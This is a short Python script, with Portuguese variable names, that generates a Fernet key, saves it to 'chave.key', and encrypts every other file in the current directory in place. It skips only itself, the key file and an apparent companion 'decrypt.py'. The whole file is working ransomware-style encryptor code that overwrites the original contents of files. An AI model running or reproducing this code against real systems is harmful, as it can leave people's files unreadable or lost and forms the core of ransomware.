from importlib.resources import contents
import os
from cryptography.fernet import Fernet
# from tkinter.filedialog import askdirectory


files = []

key = Fernet.generate_key()
with open("chave.key", "wb") as chave:
    chave.write(key)

for file in os.listdir():
    if file == "crypto.py" or file == "chave.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print (files)

for file in files:
    with open(file,"rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)

